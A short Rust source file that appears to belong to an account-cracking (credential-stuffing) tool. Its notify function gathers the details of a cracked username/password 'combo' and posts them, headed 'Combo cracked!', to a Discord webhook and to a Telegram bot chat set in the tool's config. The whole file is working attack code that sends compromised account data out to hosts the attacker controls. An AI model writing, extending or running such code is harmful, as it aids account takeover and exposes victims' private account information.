use serde_json::{json, Value};

use crate::config::{TELEGRAMCHATID, TELEGRAMTOKEN, DISCORDWEBHOOK};


pub async fn notify(combo_id: &str, _account_info: &Value) {
    if TELEGRAMTOKEN == None && TELEGRAMCHATID == None && DISCORDWEBHOOK == None {
        return
    }
    
    let client = reqwest::Client::new();

    let mut desc = String::new();

    let Some(account_info) = _account_info.as_object() else { return; };

    for (k, v) in account_info {
        let v = v.to_owned();
        desc += &format!("**{}:** {}\n", k.replace("-", " ").replace("_", " "), v);
    }

    if let Some(disc_webhook) = DISCORDWEBHOOK {
        client.post(disc_webhook)
            .json(&json!({
                "embeds": [{
                    "title": "Combo cracked!",
                    "description": format!("**Combo ID:** {combo_id}\n{desc}"),
                    "color": 0x00ff00
                }]
            }))
            .send()
            .await
            .map(|resp| println!("Discord webhook response: {}", resp.status()));
    }

    match (TELEGRAMCHATID, TELEGRAMTOKEN) {
        (Some(chat_id), Some(token)) => {
            client.post(format!("https://api.telegram.org/bot{}/sendMessage", token))
                .json(&json!({
                    "chat_id": chat_id,
                    "text": format!("Combo cracked!\n\nCombo ID: {combo_id}\n{desc}")
                }))
                .send()
                .await
                .map(|resp| println!("Telegram response: {}", resp.status()));
        },
        (_, _) => {}
    }

}